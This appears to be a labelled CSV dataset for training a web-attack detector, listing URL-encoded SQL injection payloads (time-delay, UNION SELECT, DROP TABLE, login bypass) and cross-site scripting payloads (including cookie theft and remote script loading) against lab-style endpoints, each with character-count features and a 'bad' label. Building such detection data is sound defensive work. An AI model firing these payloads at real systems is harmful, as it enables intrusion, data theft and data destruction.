method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/vulnerabilities/sqli/?id=%27+AnD+SLEEP%285%29+ANd+%271&Submit=Submit,,2,0,0,1,4,0,bad
GET,/vulnerabilities/sqli/?id=+ORDER+BY+1%2CSLEEP%285%29%2C3%2C4%23&Submit=Submit,,0,0,0,1,3,0,bad
GET,/vulnerabilities/sqli/?id=AS+INJECTX+WHERE+1%3D1+AND+1%3D1%23&Submit=Submit,,0,0,0,0,5,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+1%2C2%2C3%2C4&Submit=Submit,,0,0,0,0,4,0,bad
GET,/vulnerabilities/sqli/?id=%27+OR+%27%27+%3D+%27&Submit=Submit,,4,0,0,0,4,0,bad
GET,/vulnerabilities/sqli/?id=%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29--&Submit=Submit,,0,0,1,4,3,0,bad
GET,/vulnerabilities/sqli/?id=+AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--+&Submit=Submit,,0,0,1,8,5,0,bad
GET,/vulnerabilities/sqli/?id=AnD+SLEEP%285%29&Submit=Submit,,0,0,0,1,1,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+1--+&Submit=Submit,,0,0,1,0,5,0,bad
GET,/vulnerabilities/sqli/?id=+AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--+&Submit=Submit,,0,0,1,7,5,0,bad
GET,/vulnerabilities/sqli/?id=+ORDER+BY+SLEEP%285%29--+&Submit=Submit,,0,0,1,1,4,0,bad
GET,/vulnerabilities/sqli/?id=+ORDER+BY+1%2CSLEEP%285%29&Submit=Submit,,0,0,0,1,3,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+1%2C2--+&Submit=Submit,,0,0,1,0,5,0,bad
GET,/vulnerabilities/sqli/?id=%27%26%26SLEEP%285%29%26%26%271&Submit=Submit,,2,0,0,1,0,0,bad
GET,/vulnerabilities/sqli/?id=IF+%281%3D1%29+SELECT+%27true%27+ELSE+SELECT+%27false%27&Submit=Submit,,4,0,0,1,6,0,bad
GET,/vulnerabilities/sqli/?id=%27%29+or+true--&Submit=Submit,,1,0,1,0,2,0,bad
GET,/vulnerabilities/sqli/?id=AND+2947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%281000000000%2F2%29%29%29%29&Submit=Submit,,2,0,0,4,1,0,bad
GET,/vulnerabilities/sqli/?id=1%29+or+pg_sleep%285%29--&Submit=Submit,,0,0,1,1,2,1,bad
GET,/vulnerabilities/sqli/?id=+ORDER+BY+1%2CSLEEP%285%29%2C3%23&Submit=Submit,,0,0,0,1,3,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+1&Submit=Submit,,0,0,0,0,4,0,bad
GET,/vulnerabilities/sqli/?id=RANDOMBLOB%281000000000%2F2%29&Submit=Submit,,0,0,0,1,0,0,bad
GET,/vulnerabilities/sqli/?id=AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29--&Submit=Submit,,0,0,1,4,4,0,bad
GET,/vulnerabilities/sqli/?id=%22+or+%22%22%5E%22&Submit=Submit,,0,4,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=1%29+or+benchmark%2810000000%2CMD5%281%29%29%23&Submit=Submit,,0,0,0,2,2,0,bad
GET,/vulnerabilities/sqli/?id=AS+INJECTX+WHERE+1%3D1+AND+1%3D0&Submit=Submit,,0,0,0,0,5,0,bad
GET,/vulnerabilities/sqli/?id=%27+or+%27%27+%27&Submit=Submit,,4,0,0,0,3,0,bad
GET,/vulnerabilities/sqli/?id=+AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%29%29--+&Submit=Submit,,0,0,1,10,5,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+1%2C2%2C3%2C4%23&Submit=Submit,,0,0,0,0,4,0,bad
GET,/vulnerabilities/sqli/?id=OR+2947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%281000000000%2F2%29%29%29%29&Submit=Submit,,2,0,0,4,1,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2C3&Submit=Submit,,0,0,0,1,3,0,bad
GET,/vulnerabilities/sqli/?id=ORDER+BY+SLEEP%285%29&Submit=Submit,,0,0,0,1,2,0,bad
GET,/vulnerabilities/sqli/?id=AND+1&Submit=Submit,,0,0,0,0,1,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29--+&Submit=Submit,,0,0,1,2,5,0,bad
GET,/vulnerabilities/sqli/?id=admin%22+or+%221%22%3D%221&Submit=Submit,,0,4,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=%22%29+or+benchmark%2810000000%2CMD5%281%29%29%23&Submit=Submit,,0,1,0,2,2,0,bad
GET,/vulnerabilities/sqli/?id=%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29&Submit=Submit,,0,0,0,4,3,0,bad
GET,/vulnerabilities/sqli/?id=admin%27+or+%271%27%3D%271%27%23&Submit=Submit,,5,0,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=ORDER+BY+24--&Submit=Submit,,0,0,1,0,2,0,bad
GET,/vulnerabilities/sqli/?id=%27+or+%27%27-%27&Submit=Submit,,4,0,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+1%2C2&Submit=Submit,,0,0,0,0,4,0,bad
GET,/security.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/sqli/?id=SELECT+*+FROM+members+WHERE+username+%3D+%27admin%27--%27+AND+password+%3D+%27password%27&Submit=Submit,,5,0,1,0,11,0,bad
GET,/vulnerabilities/sqli/?id=%27%29+or+%271%27%3D%271--&Submit=Submit,,4,0,1,0,2,0,bad
GET,/vulnerabilities/sqli/?id=SELECT+%2F*%2132302+1%2F0%2C+*%2F+1+FROM+tablename&Submit=Submit,,0,0,0,0,6,0,bad
GET,/vulnerabilities/sqli/?id=%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29%23&Submit=Submit,,0,0,0,4,3,0,bad
GET,/vulnerabilities/sqli/?id=%27%29%29+or+%28%28%27x%27%29%29%3D%28%28%27x&Submit=Submit,,4,0,0,4,2,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19&Submit=Submit,,6,0,0,0,4,0,bad
GET,/vulnerabilities/sqli/?id=admin%27+or+%271%27%3D%271&Submit=Submit,,4,0,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=admin%27+--&Submit=Submit,,1,0,1,0,1,0,bad
GET,/vulnerabilities/sqli/?id=%22+or+%22%22+%22&Submit=Submit,,0,4,0,0,3,0,bad
GET,/vulnerabilities/sqli/?id=SLEEP%285%29--&Submit=Submit,,0,0,1,1,0,0,bad
GET,/vulnerabilities/sqli/?id=or+SLEEP%285%29&Submit=Submit,,0,0,0,1,1,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+USER%28%29--+&Submit=Submit,,0,0,1,1,5,0,bad
GET,/vulnerabilities/sqli/?id=%27+AND+id+IS+NULL%3B+--&Submit=Submit,,1,0,1,0,5,0,bad
GET,/vulnerabilities/sqli/?id=+ORDER+BY+SLEEP%285%29&Submit=Submit,,0,0,0,1,3,0,bad
GET,/vulnerabilities/sqli/?id=DROP%2F*comment*%2Fsampletable&Submit=Submit,,0,0,0,0,0,0,bad
GET,/vulnerabilities/sqli/?id=%22+or+true--&Submit=Submit,,0,1,1,0,2,0,bad
GET,/vulnerabilities/sqli/?id=benchmark%2850000000%2CMD5%281%29%29--&Submit=Submit,,0,0,1,2,0,0,bad
GET,/vulnerabilities/sqli/?id=%22+or+%22%22%26%22&Submit=Submit,,0,4,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=%2500&Submit=Submit,,0,0,0,0,0,0,bad
GET,/vulnerabilities/sqli/?id=1%22+AND+1%3D0+UNION+ALL+SELECT+%22admin%22%2C+%2281dc9bdb52d04dc20036dbd8313ed055&Submit=Submit,,0,4,0,0,7,0,bad
GET,/vulnerabilities/sqli/?id=+and+%28select+substring%28%40%40version%2C1%2C1%29%29%3D%27X%27&Submit=Submit,,2,0,0,2,3,1,bad
GET,/vulnerabilities/sqli/?id=%252c%28select%2520*%2520from%2520%28select%28sleep%2810%29%29%29a%29&Submit=Submit,,0,0,0,4,0,3,bad
GET,/vulnerabilities/sqli/?id=1+or+sleep%285%29%23&Submit=Submit,,0,0,0,1,2,1,bad
GET,/vulnerabilities/sqli/?id=%3Bwaitfor+delay+%270%3A0%3A5%27--&Submit=Submit,,2,0,1,0,2,2,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2&Submit=Submit,,6,0,0,0,4,0,bad
GET,/vulnerabilities/sqli/?id=admin%27%29+or+%28%271%27%3D%271%27%23&Submit=Submit,,5,0,0,1,2,0,bad
GET,/vulnerabilities/sqli/?id=WHERE+1%3D1+AND+1%3D1&Submit=Submit,,0,0,0,0,3,0,bad
GET,/vulnerabilities/sqli/?id=%22+OR+%22%22+%3D+%22&Submit=Submit,,0,4,0,0,4,0,bad
GET,/vulnerabilities/sqli/?id=+AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%29%29--+&Submit=Submit,,0,0,1,3,5,0,bad
GET,/vulnerabilities/sqli/?id=%27+GROUP+BY+columnnames+having+1%3D1+--&Submit=Submit,,1,0,1,0,6,0,bad
GET,/vulnerabilities/sqli/?id=1+or+pg_sleep%285%29--&Submit=Submit,,0,0,1,1,2,1,bad
GET,/vulnerabilities/sqli/?id=%27LIKE%27&Submit=Submit,,2,0,0,0,0,0,bad
GET,/vulnerabilities/sqli/?id=DROP+sampletable%3B%23&Submit=Submit,,0,0,0,0,1,0,bad
GET,/vulnerabilities/sqli/?id=%2C%28select+*+from+%28select%28sleep%2810%29%29%29a%29&Submit=Submit,,0,0,0,4,3,3,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+USER%28%29%2CSLEEP%285%29--+&Submit=Submit,,0,0,1,2,5,0,bad
GET,/vulnerabilities/sqli/?id=%26%26SLEEP%285%29--&Submit=Submit,,0,0,1,1,0,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27&Submit=Submit,,6,0,0,0,4,0,bad
GET,/vulnerabilities/sqli/?id=%22+or+benchmark%2810000000%2CMD5%281%29%29%23&Submit=Submit,,0,1,0,2,2,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5&Submit=Submit,,2,0,0,4,3,0,bad
GET,/vulnerabilities/sqli/?id=%27+or+%22&Submit=Submit,,1,1,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+NULL--+&Submit=Submit,,0,0,1,0,5,0,bad
GET,/vulnerabilities/sqli/?id=1%27+ORDER+BY+1--%2B&Submit=Submit,,1,0,1,0,3,0,bad
GET,/vulnerabilities/sqli/?id=+AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29--+&Submit=Submit,,0,0,1,6,5,0,bad
GET,/vulnerabilities/sqli/?id=%27+OR+%271&Submit=Submit,,2,0,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=SLEEP%281%29%2F*%27+or+SLEEP%281%29+or+%27%22+or+SLEEP%281%29+or+%22*%2F&Submit=Submit,,2,2,0,3,8,0,bad
GET,/vulnerabilities/sqli/?id=DROP+sampletable%3B--&Submit=Submit,,0,0,1,0,1,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL--+&Submit=Submit,,2,0,1,4,5,0,bad
GET,/vulnerabilities/sqli/?id=%2F*Comment+Here*%2F+%28SM%29&Submit=Submit,,0,0,0,1,2,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+1%2C2%2C3%23&Submit=Submit,,0,0,0,0,4,0,bad
GET,/vulnerabilities/sqli/?id=or+1%3D1%2F*&Submit=Submit,,0,0,0,0,1,0,bad
GET,/vulnerabilities/sqli/?id=or+1%3D1&Submit=Submit,,0,0,0,0,1,0,bad
GET,/vulnerabilities/sqli/?id=+AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--+&Submit=Submit,,0,0,1,4,5,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+ALL+SELECT+NULL+&Submit=Submit,,0,0,0,0,5,0,bad
GET,/vulnerabilities/sqli/?id=%27%3D0--%2B&Submit=Submit,,1,0,1,0,0,0,bad
GET,/vulnerabilities/sqli/?id=AND+1083%3D1083+AND+%281427%3D1427&Submit=Submit,,0,0,0,1,3,0,bad
GET,/vulnerabilities/sqli/?id=1+or+benchmark%2810000000%2CMD5%281%29%29%23&Submit=Submit,,0,0,0,2,2,0,bad
GET,/vulnerabilities/sqli/?id=+ORDER+BY+1%2CSLEEP%285%29%23&Submit=Submit,,0,0,0,1,3,0,bad
GET,/vulnerabilities/sqli/?id=%40variable%09local+variable&Submit=Submit,,0,0,0,0,1,0,bad
GET,/vulnerabilities/sqli/?id=+ORDER+BY+1%2CSLEEP%285%29%2C3--+&Submit=Submit,,0,0,1,1,4,0,bad
GET,/vulnerabilities/sqli/?id=%2Bbenchmark%283200%2CSHA1%281%29%29%2B%27&Submit=Submit,,1,0,0,2,0,0,bad
GET,/vulnerabilities/sqli/?id=SELECT+*+FROM+products+WHERE+id+%3D+10%3B+DROP+members--&Submit=Submit,,0,0,1,0,9,0,bad
GET,/vulnerabilities/sqli/?id=%27+or+%27%27%26%27&Submit=Submit,,4,0,0,0,2,0,bad
GET,/vulnerabilities/sqli/?id=+ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29&Submit=Submit,,2,0,0,3,3,0,bad
GET,/vulnerabilities/sqli/?id=+UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6&Submit=Submit,,2,0,0,4,3,0,bad
GET,/vulnerabilities/sqli/?id=or+1%3D1%23&Submit=Submit,,0,0,0,0,1,0,bad
GET,/vulnerabilities/sqli/?id=+ORDER+BY+1%2CSLEEP%285%29%2C3%2C4--+&Submit=Submit,,0,0,1,1,4,0,bad
GET,/vulnerabilities/sqli/?id=%22%29+or+true--&Submit=Submit,,0,1,1,0,2,0,bad
GET,/wp-content/plugins/wp-ui/js/wp-ui.js?ver=0.8.8,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv%2Fonmouseover%3D%27alert%281%29%27%3E+style%3D%22x%3A%22%3E&user_token=14bc8f43b340e662a7deb9b4a64ed968,,2,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cobject+onerror%3Djavascript%3Ajavascript%3Aalert%281%29%3E&user_token=1cf939825a1211b6a848d8f33218dc56,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E&user_token=dc979fc337ff91294d6e142f8724efa8,,2,4,0,2,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3CSCRIPT+onreadystatechange%3Djavascript%3Ajavascript%3Aalert%281%29%3B%3E%3C%2FSCRIPT%3E&user_token=4c6b257d0fb789bccb8ec793a698b440,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E&user_token=15a6d32bdbe4eb9ae99daa1a68ebc9bc,,2,0,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ciframe%2Fonreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29+worksinIE%3E&user_token=c00e9f3ab1644735681f96f1cf975a10,,2,0,0,1,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+onmouseover%3D%22alert%28%27xxs%27%29%22%3E&user_token=2e395010fbe9d692c2a551726888333c,,2,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Ajavascript%3Aalert%281%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS&user_token=89002969edf1a0a2035f2473126e1779,,0,2,0,2,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E&user_token=b92ae3a12c8aa2013825d15c7460a8c4,,2,2,0,1,1,1,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22jav%26%2365ascript%3Ajavascript%3Aalert%281%29%22%3Etest1%3C%2Fa%3E&user_token=541cebf6d00331872ab0e192a2abbc23,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%27%22%3E%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&user_token=0c572f8acb1b17eb48d2a3d51b2b9526,,3,1,0,1,0,4,bad
GET,/vulnerabilities/xss_r/?name=window.alert%28%22Bonjour+%21%22%29%3B&user_token=8802bd4a88324453f449417849e20cfc,,0,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=exp%2F*%3CA+STYLE%3D%27no%5Cxss%3Anoxss%28%22*%2F%2F*%22%29%3Bxss%3Aex%2F*XSS*%2F%2F*%2F*%2Fpression%28alert%28%22XSS%22%29%29%27%3E&user_token=22a2960be1d5769c3067fab29f9c3a0c,,2,4,0,3,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3D%22x%22%3Ex%3C%2Fdiv%3E+%3Cxml%3Anamespace+prefix%3D%22t%22%3E+%3Cimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+targetElement%3D%22x%22+to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E&user_token=07745ec5cdf9e309ffd1fddf6aa1ef11,,0,14,0,1,10,7,bad
GET,/vulnerabilities/xss_r/?name=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E&user_token=47853cbba626b17ac65f148ef77fc0ce,,0,0,0,1,0,4,bad
GET,/vulnerabilities/xss_r/?name=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=366985d42f09d0ec94bd3f217ae028ba,,2,4,0,1,2,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2Fscript%3E+&user_token=2ba3ad7d1877a15bd8cd71368b2fcb95,,0,0,0,2,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E&user_token=df9527147b5c97b1befde4410fb0193f,,2,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Ajavascript%3Aalert%281%29%3B%22%3E&user_token=4342fc5765c83d7a953b91fac72fe5a9,,0,4,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca%2Fhref%3D%22javascript%3A%26%2313%3B+javascript%3Aprompt%281%29%22%3E%3Cinput+type%3D%22X%22%3E&user_token=7c3cbb3c7baba74fcba9f55db52df906,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E&user_token=2f92c2237c56cbafcc485de8ff70b292,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onLoad%3D%22alert%28%27XSS%27%29%3B%22&user_token=36fcb29d0fbcaabee1598ba6c7951c67,,2,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%26%2300%3B%3C%2Fform%3E%3Cinput+type%26%2361%3B%22date%22+onfocus%3D%22alert%281%29%22%3E&user_token=ed3cb0d8dba93825a2b5dd26973b0350,,0,4,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+background%3Djavascript%3A%27%22%3E%3Cscript%3Ealert%28navigator.userAgent%29%3C%2Fscript%3E%3E%3C%2Fbody%3E&user_token=1f3e8463a0ffb28e85493b72037b94cb,,1,1,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E&user_token=3d3d1359feb3c7ea4c44a2efdeffcf29,,2,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3C%21%5BCDATA%5Bcript%3Ajavascript%3Aalert%281%29%3B%22%3E%5D%5D%3C%2FC%3E%3CX%3E%3C%2Fxml%3E&user_token=3086fca2818ea13a2be26aa24b480aec,,0,2,0,1,2,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22XSS+by+%5Cnxss%22%29%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+by+xss%3C%2Fh1%3E%3C%2Fmarquee%3E&user_token=8bea298e7ab22808388d9af6acd241b8,,0,2,0,1,4,4,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E&user_token=cc081ca6b4a71aecf13ab3b4e42ed806,,0,6,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%3Cform%3E%3Cbutton+formaction%3Djavascript%26colon%3Balert%281%29%3ECLICKME&user_token=866ec16ac1609b1b4281c3dc8277051e,,0,0,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cmeta+content%3D%22%26NewLine%3B+1+%26NewLine%3B%3B+JAVASCRIPT%26colon%3B+alert%281%29%22+http-equiv%3D%22refresh%22%2F%3E&user_token=3ed8626e7dd6165b4f89b96cfe2d31ca,,0,4,0,1,6,2,bad
GET,/vulnerabilities/xss_r/?name=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Ajavascript%3Aalert%281%29%29%22%3E&user_token=7ba1347233d6c2414ebfdff500c20c84,,0,2,0,2,2,6,bad
GET,/vulnerabilities/xss_r/?name=%27%3E%22%3E%3Cscript+src+%3D+%27http%3A%2F%2Fwww.site.com%2FXSS.js%27%3E%3C%2Fscript%3E&user_token=22aae45d350e46b6d76721f9809e516d,,3,1,0,0,3,3,bad
GET,/vulnerabilities/xss_r/?name=%3C%2Fbr+style%3Da%3Aexpression%28alert%28%29%29%3E&user_token=51990aef0173daf803ac64f61321d497,,0,0,0,2,1,3,bad
GET,/vulnerabilities/xss_r/?name=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&user_token=b20101860cf8e6336935bb93c702e187,,0,1,0,1,0,4,bad
GET,/vulnerabilities/xss_r/?name=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E&user_token=c952db43fde1232b060b5aa343866455,,2,4,0,2,1,4,bad
GET,/vulnerabilities/xss_r/?name=%22%3E%2FKinG-InFeT.NeT%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&user_token=7cb3246acdca474eaac22a64ca67e28a,,0,1,0,1,0,4,bad
GET,/vulnerabilities/xss_r/?name=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=49fba528cd675fe7548071974719db54,,2,4,0,1,3,4,bad
GET,/vulnerabilities/xss_r/?name=admin%22%29+or+%221%22%3D%221%22%23&user_token=43465a254cc3ac16ccb8bf30747a4ed2,,0,5,0,0,2,0,bad
GET,/vulnerabilities/xss_r/?name=admin%22%29+or+%221%22%3D%221%22--&user_token=b68811a4ba9409057b239fc32dc4f8cf,,0,5,1,0,2,0,bad
GET,/vulnerabilities/sqli/?id=%5B%221337%3D1337%22%2C+++%22MSACCESS%2CSQLITE%2CPOSTGRESQL%2CORACLE%2CMSSQL%2CMYSQL%22%5D&Submit=Submit&user_token=841bfbb78a7cffbf1560ce00bd0437bd,,0,4,0,0,3,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22get_current_ts_config%28%29%3Dget_current_ts_config%28%29%22+%2C%22POSTGRESQL%22%5D&Submit=Submit&user_token=3d042145c96740052c71487d419242ef,,0,4,0,2,1,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22sqlite_version%28%29%3Dsqlite_version%28%29%22+++++++++++++++%2C%22SQLITE%22%5D&Submit=Submit&user_token=794ce5326d070623435d884ef531ac47,,0,4,0,2,15,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22%27i%27%3D%27i%27%22%2C+++++%22MSACCESS%2CSQLITE%2CPOSTGRESQL%2CORACLE%2CMSSQL%2CMYSQL%22%5D&Submit=Submit&user_token=6c5847fdf013c6a17fcb23079a526a9c,,4,4,0,0,5,0,bad
GET,/vulnerabilities/sqli/?id=1%27+AND+%5BRANDNUM%5D%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%28%5BSLEEPTIME%5D00000000%2F2%29%29%29%29&Submit=Submit&user_token=52379852cb4a801ed85e50765ad531cb,,3,0,0,4,2,0,bad
GET,/vulnerabilities/sqli/?id=%5B%22IIF%28ATN%282%29%3E0%2C1%2C0%29+BETWEEN+2+AND+0%22+++++++++++++++%2C%22MSACCESS%22%5D&Submit=Submit&user_token=80fbc024e69412e59dfb3c4a278480ad,,0,4,0,2,19,0,bad
